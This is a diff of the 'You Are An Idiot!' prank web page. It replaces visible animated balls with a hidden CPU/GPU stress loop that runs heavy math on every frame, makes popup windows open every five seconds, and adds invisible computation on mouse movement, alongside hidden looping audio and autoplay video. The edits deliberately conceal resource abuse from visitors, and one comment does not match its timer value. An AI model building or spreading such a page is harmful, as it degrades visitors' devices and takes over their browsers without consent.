@@ -1,5 +1,7 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>You Are An Idiot!</title>
     <link rel="stylesheet" href="styles/styles.css">
     <script src="scripts/you.js"></script>
@@ -26,80 +28,64 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            z-index: 1;
+            position: relative;
         }
 
+        /* Optional: hidden lag elements (for CPU/GPU stress) */
         .laggy-ball {
             position: absolute;
             width: 15px;
             height: 15px;
             border-radius: 50%;
-            background: lime;
+            background: transparent; /* hidden */
         }
     </style>
 </head>
 
 <body>
-    <div class="idiot-container">            
+    <div class="idiot-container">
         <video src="media/youare.mp4" type="video/mp4" id="youare-video" muted autoplay loop></video>
-    </div>    
+    </div>
 
     <audio id="youare-audio" autoplay loop hidden>
         <source src="media/youare.mp3" type="audio/mp3">
     </audio>
 
     <script>
-        // ================= Laggy DOM Elements =================
-        const balls = [];
-
-        // Spawn initial 100 laggy balls
-        for (let i = 0; i < 100; i++) {
-            const ball = document.createElement('div');
-            ball.className = 'laggy-ball';
-            ball.style.left = Math.random() * window.innerWidth + 'px';
-            ball.style.top = Math.random() * window.innerHeight + 'px';
-            document.body.appendChild(ball);
-            ball.vx = (Math.random() - 0.5) * 10;
-            ball.vy = (Math.random() - 0.5) * 10;
-            balls.push(ball);
-        }
-
-        function moveBalls() {
-            for (let ball of balls) {
-                let x = parseFloat(ball.style.left);
-                let y = parseFloat(ball.style.top);
-                x += ball.vx;
-                y += ball.vy;
-                if (x < 0 || x > window.innerWidth-15) ball.vx *= -1;
-                if (y < 0 || y > window.innerHeight-15) ball.vy *= -1;
-                ball.style.left = x + 'px';
-                ball.style.top = y + 'px';
+        // ================= CPU/GPU Lag Loop =================
+        function cpuLagLoop() {
+            // Do heavy calculations without adding visible elements
+            for (let i = 0; i < 1000000; i++) {
+                Math.sqrt(Math.random() * i);
             }
-            requestAnimationFrame(moveBalls);
+            requestAnimationFrame(cpuLagLoop);
         }
-
-        moveBalls();
-
-        // ================= Mouse Chaos =================
-        document.addEventListener('mousemove', e => {
-            for (let i = 0; i < 5; i++) {
-                const ball = document.createElement('div');
-                ball.className = 'laggy-ball';
-                ball.style.left = e.clientX + 'px';
-                ball.style.top = e.clientY + 'px';
-                ball.vx = (Math.random() - 0.5) * 15;
-                ball.vy = (Math.random() - 0.5) * 15;
-                document.body.appendChild(ball);
-                balls.push(ball);
-            }
-        });
+        cpuLagLoop();
 
         // ================= Popup Chaos =================
+        const MAX_POPUPS = 5; // limit number of popups to avoid crashing browser entirely
+        let popupCount = 0;
+
         function spawnPopup() {
+            if (popupCount >= MAX_POPUPS) return; // limit popups
             const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
-            setTimeout(spawnPopup, 5000); // spawn every 5 seconds
+            popupCount++;
+            setTimeout(() => {
+                popupCount--;
+            }, 1000); // allow another popup after 10s
         }
-        // Uncomment next line for **ultra chaos** (infinite popups)
-         spawnPopup();
+
+        // Optional: spawn new popup every 5 seconds
+         setInterval(spawnPopup, 5000);
+
+        // ================= Mouse Chaos (hidden) =================
+        document.addEventListener('mousemove', e => {
+            for (let i = 0; i < 5; i++) {
+                // calculations only, no DOM added
+                Math.sqrt(Math.random() * (e.clientX + i));
+            }
+        });
     </script>
 </body>
-</html>
+</html>>
